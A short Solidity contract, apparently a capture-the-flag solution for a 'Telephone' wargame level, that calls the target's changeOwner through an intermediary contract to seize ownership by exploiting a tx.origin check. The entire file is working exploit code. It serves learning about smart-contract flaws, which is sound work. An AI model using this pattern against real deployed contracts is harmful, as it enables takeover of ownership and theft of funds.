// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';
contract TelephoneHack {


  Telephone public telephoneContract;

constructor(address _telephoneInstanceAddr) public {
        telephoneContract = Telephone(_telephoneInstanceAddr);
           }

  function hack(address _newOwner) public {
    telephoneContract.changeOwner(_newOwner);
  }
}
